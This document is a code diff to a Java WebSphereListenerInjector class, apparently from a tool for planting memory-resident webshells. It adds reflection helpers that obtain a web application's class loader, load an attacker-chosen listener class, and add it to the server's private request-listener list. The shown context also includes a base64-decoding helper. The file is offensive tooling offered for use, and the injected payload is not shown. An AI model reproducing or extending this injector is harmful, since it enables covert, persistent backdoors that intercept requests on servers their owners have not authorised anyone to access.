@@ -64,12 +64,17 @@ public class WebSphereListenerInjector {
         return contexts;
     }
 
-    private Object getListener(Object context) {
-        Object listener = null;
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
+    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return (ClassLoader) invokeMethod(context, "getClassLoader", null, null);
+        } catch (Exception ignored) {
+            return (ClassLoader) getFieldValue(context, "loader");
         }
+    }
+
+    private Object getListener(Object context) throws Exception {
+        Object listener = null;
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             listener = classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -89,6 +94,51 @@ public class WebSphereListenerInjector {
         List listeners = (List) getFieldValue(context, "servletRequestListeners");
         // 判断是否已经存在
         if (!listeners.contains(listener)) listeners.add(listener);
+    }
+
+    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
+        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
+    }
+
+    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
+        Method method = null;
+
+        Class tempClass = clazz;
+        while (method == null && tempClass != null) {
+            try {
+                if (paramClazz == null) {
+                    Method[] methods = tempClass.getDeclaredMethods();
+                    for (int i = 0; i < methods.length; i++) {
+                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
+                            method = methods[i];
+                            break;
+                        }
+                    }
+                } else {
+                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
+                }
+            } catch (NoSuchMethodException e) {
+                tempClass = tempClass.getSuperclass();
+            }
+        }
+        if (method == null) {
+            throw new NoSuchMethodException(methodName);
+        }
+        method.setAccessible(true);
+        if (obj instanceof Class) {
+            try {
+                return method.invoke(null, param);
+            } catch (IllegalAccessException e) {
+                throw new RuntimeException(e.getMessage());
+            }
+        } else {
+            try {
+                return method.invoke(obj, param);
+            } catch (IllegalAccessException e) {
+                throw new RuntimeException(e.getMessage());
+            }
+        }
     }
 
     public static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
